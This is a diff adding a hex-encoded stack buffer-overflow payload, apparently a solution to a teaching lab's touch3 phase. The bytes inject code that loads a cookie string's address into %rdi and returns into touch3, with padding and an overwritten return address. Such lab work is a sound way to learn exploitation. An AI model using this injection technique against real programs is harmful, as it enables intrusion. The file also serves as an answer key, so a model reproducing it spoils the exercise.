@@ -1,0 +1,7 @@
+48 c7 c7 a8 dc 61 55 68 /* movq $0x5561dca8,%rdi (address of the cookie's string) */
+fa 18 40 00 c3 00 00 00 /* push $0x4018fa (the address of touch3 be pointed by %rsp) */ /* ret */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 /* the address of movq */
+35 39 62 39 39 37 66 61 /* the cookie's string */
